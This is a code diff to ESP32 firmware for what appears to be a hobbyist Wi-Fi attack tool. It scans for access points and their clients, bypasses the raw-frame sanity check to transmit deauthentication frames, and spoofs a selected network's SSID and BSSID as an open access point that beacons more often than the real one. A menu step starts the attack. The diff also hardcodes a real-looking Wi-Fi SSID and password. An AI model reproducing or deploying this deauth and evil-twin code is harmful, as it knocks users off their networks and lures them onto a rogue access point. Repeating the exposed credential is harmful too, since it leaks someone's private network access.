@@ -8,34 +8,23 @@
 #include "esp_wifi_types.h"
 #include <manageClients.h>
 #include "nvs_flash.h"
+#include "esp_netif.h"
 
 
-#if ARDUINO_USB_CDC_ON_BOOT != 1
-#warning "If you need to monitor printed data, be sure to set USB CDC On boot to ENABLE, otherwise you will not see any data in the serial monitor"
-#endif
-
-#ifndef BOARD_HAS_PSRAM
-#error "Detected that PSRAM is not turned on. Please set PSRAM to OPI PSRAM in ArduinoIDE"
-#endif
+//Wifi network esp32 will connect to
+#define SSID "Galaxy S21 5G a856"
+#define PASSWORD "rpm1188A"
 
 /*
     TODO:
-    espressifs function does not support transmitting deauth frames, going to try manual sockets
     https://stackoverflow.com/questions/21411851/how-to-send-data-over-a-raw-ethernet-socket-using-sendto-without-using-sockaddr
     https://www.man7.org/linux/man-pages/man7/ip.7.html
 
     https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
 
-    Figure out why ap callback function crashed when accessing event data
-    detect if device is connected to my ap before deauthing
-    
-    Check if advertised bssid is the same as the mac device are sending data to
-    Mess with client discovery to see if there is a better way to go about it
-
     Look into why correct AP name is no longer advertised when clearing nvs flash
 
-    Filter out broadcast mac addresses when scanning for clients
-    https://en.wikipedia.org/wiki/Multicast_address#Ethernet
+    Move ble callback to outside the class, directly call stateConfig function
 */
 
 //configure AP
@@ -60,6 +49,7 @@ ConnectedClients connectedClients;
 //Wifi config variables
 wifi_config_t configAP;
 wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
+
 wifi_promiscuous_filter_t filter;
 uint8_t deauthClients[50][6]; //Store client mac addresse
 int numDeauthClients = 0;
@@ -143,8 +133,7 @@ bool checkIfMulticast(uint8_t macAddr[]) {
     else if(memcmp(macAddr, multicast2, sizeof(multicast2)) == 0) {
         return true;
     }
-    //else if(memcmp(&macAddr, multicast3, sizeof(multicast3)) == 0) {
-    else if(macAddr[0] == multicast3[0] && macAddr[1] == multicast3[1] && macAddr[2] == multicast3[2]) {
+    else if(memcmp(macAddr, multicast3, sizeof(multicast3)) == 0) {
         return true;
     }
     else if(memcmp(macAddr, multicast4, sizeof(multicast4)) == 0) {
@@ -159,9 +148,6 @@ bool checkIfMulticast(uint8_t macAddr[]) {
     else if(memcmp(macAddr, multicast7, sizeof(multicast7)) == 0) {
         return true;
     }
-    Serial.printf("%x and %x\n", macAddr[0], multicast3[0]);
-    Serial.printf("%x and %x\n", macAddr[1], multicast3[1]);
-    Serial.printf("%x and %x\n", macAddr[2], multicast3[2]);
 
     return false;
 }
@@ -171,25 +157,32 @@ void scanForClient(wifi_promiscuous_pkt_t *mgmtPacket) {
     BeaconFrame *beacon = (BeaconFrame*)mgmtPacket->payload;
     uint8_t destAddr[6];
     uint8_t recvAddr[6];
-    //Get destination mac from recived packet
+
+    //Get send and recieve address from recieved frame
     beacon->getDestinationAddress(destAddr, 6);
     beacon->getSenderAddress(recvAddr, 6);
-    //Get position mac is stored in
+
+    //Check if frame is being sent by or to an existing ap. Only one should a position. This is the access point mac
     int posDestAddr = apInfo.checkExisting(destAddr);
     int posRecvAddr = apInfo.checkExisting(recvAddr);
-    if(posDestAddr != -1 && !checkIfMulticast(destAddr)) {
+
+
+    if(posDestAddr != -1) {
         uint8_t sendAddr[6];
         beacon->getSenderAddress(sendAddr, 6);
-        Serial.println("Destination MAC exists");
-        apInfo.addClient(sendAddr, posDestAddr);
+        if(apInfo.checkClientExist(sendAddr, posDestAddr) == 0 && !checkIfMulticast(sendAddr)) { //Check if client already exists and filter out multicast addresses
+            Serial.println("Destination MAC exists");
+            apInfo.addClient(sendAddr, posDestAddr); //Add to existing clients
+        }
     }
-    if(posRecvAddr != -1 && !checkIfMulticast(recvAddr)) {
+    if(posRecvAddr != -1) {
         uint8_t clientAddr[6];
         beacon->getDestinationAddress(clientAddr, 6);
-        Serial.println("Redvier MAC exists");
-        apInfo.addClient(clientAddr, posRecvAddr);
+        if(apInfo.checkClientExist(clientAddr, posDestAddr) == 0 && !checkIfMulticast(clientAddr)) { //Check if client already exists and filter out multicast addresses
+            Serial.println("Redvier MAC exists");
+            apInfo.addClient(clientAddr, posRecvAddr); //Add to existing clients
+        }
     }
-
 }
 
 
@@ -384,11 +377,14 @@ void listClients() {
 }
 
 
-void configAPSpoof(uint8_t ssid[], int ssidLen, uint8_t bssid[], int channel) {
+esp_netif_t *configAPSpoof(uint8_t ssid[], int ssidLen, uint8_t bssid[], int channel) {
+    esp_netif_t *spoofAP = esp_netif_create_default_wifi_ap();
+
     Serial.println("Setting AP values");
     configAP.ap.channel = channel;
     configAP.ap.max_connection = 2;
     configAP.ap.authmode = WIFI_AUTH_OPEN;
+    configAP.ap.beacon_interval = 50; //Advertise more often than other ap
 
     Serial.printf("Copying ssid %s\n", ssid);
     memcpy(configAP.ap.ssid, ssid, 32);
@@ -396,6 +392,8 @@ void configAPSpoof(uint8_t ssid[], int ssidLen, uint8_t bssid[], int channel) {
     Serial.println("Initializing config");
     esp_wifi_set_config(WIFI_IF_AP, &configAP);
     esp_wifi_set_mac(WIFI_IF_AP, bssid);
+
+    return spoofAP;
 }
 
 
@@ -483,6 +481,9 @@ void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void 
         sendMsg(message);
         //sendMsg("Disconnect Eevnt");
     }
+    else {
+        Serial.println(event_id);
+    }
 }
 
 
@@ -491,11 +492,18 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
     return 0;
 }
 
+static void wifi_event_handler(void *arg, esp_event_base_t event_base,
+                               int32_t event_id, void *event_data) {
+                                Serial.println("Delete me");
+                               }
 
-void startAPSpoof() {
+
+void startAPSpoof(esp_netif_t *ap_interface) {
+    //Make sure device is no longer scanning
     esp_wifi_set_promiscuous(false);
     esp_event_loop_create_default();
     apEventGroup = xEventGroupCreate();
+
     esp_event_handler_instance_register(
         WIFI_EVENT,
         ESP_EVENT_ANY_ID,
@@ -503,10 +511,9 @@ void startAPSpoof() {
         NULL,
         NULL
         );
+
     esp_wifi_start();
 
-    //const void *buffer = &rawDeauthFrame;
-    //int bufferSize = sizeof(rawDeauthFrame);
     int frameSize = sizeof(rawDeauthFrame);
     uint8_t deauthFrame[frameSize];
     
@@ -541,6 +548,8 @@ void setup()
     //prevent esp from advertising previously spoofed ap
     //nvs_flash_erase();
     //nvs_flash_init();
+
+    esp_netif_init();
 
     Serial.begin(115200);
     //Serup wifi access point
@@ -616,15 +625,16 @@ void configState() {
                     Serial.print("Cur num: ");
                     Serial.println(selectedApNum);
                     if(selectedApNum < apInfo.getNumAP()) {
-                        uint8_t *bssid = apInfo.getBSSID(selectedApNum);
+                        
                         char msg[50];
                         snprintf(msg, 50, "AP '%s' Selected.", charSSID);
                         sendMsg(msg);
                         
                         //Store info to spoof ap
-                        configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
+                        //configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
                     }   
                     else {
+                        selectedApNum = -1;
                         sendMsg("Selected AP does not exist");
                     }
                 }
@@ -651,9 +661,13 @@ void configState() {
                 break;
             }
             case 9: { //start attack
+                uint8_t **ssidList = apInfo.getSSID();
+                uint8_t *bssid = apInfo.getBSSID(selectedApNum);
                 if(selectedApNum != -1 && numDeauthClients > 0) {
+                    esp_netif_t *ap_interface = configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
+
                     sendMsg("Starting attack");
-                    startAPSpoof();
+                    startAPSpoof(ap_interface);
                 }
                 else if(selectedApNum == -1) {
                     sendMsg("[Error] An an access point must be selected");
@@ -661,8 +675,15 @@ void configState() {
                 else if(numDeauthClients == 0) {
                     sendMsg("No clients selected. Defaulting to all.");
                     selectAllDeauthClients();
-                    startAPSpoof();
+                    esp_netif_t *ap_interface = configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
+                    startAPSpoof(ap_interface);
                 }
+                break;
+            }
+            case 10: {
+#ifdef SSID
+                //connectToWifi();
+#endif
                 break;
             }
             default: {
@@ -700,11 +721,12 @@ void loop()
         case 2: //Scan for clients only on channels ap's have been discovered on
             int apNum = apInfo.getNumAP();
 
-            if(millis() - curTime > 1000) {
+            if(millis() - curTime > 500) {
                 if(channel < apNum) {
-                    esp_wifi_set_channel(apInfo.getChannel(channel), WIFI_SECOND_CHAN_NONE);
+                    int scanApChannel = apInfo.getChannel(channel);
+                    esp_wifi_set_channel(scanApChannel, WIFI_SECOND_CHAN_NONE);
                     channel++;
-                    Serial.printf("Current Channel: %i\n", channel);
+                    Serial.printf("Current Channel: %i\n", scanApChannel);
                 }
                 else {
                     channel = 0;
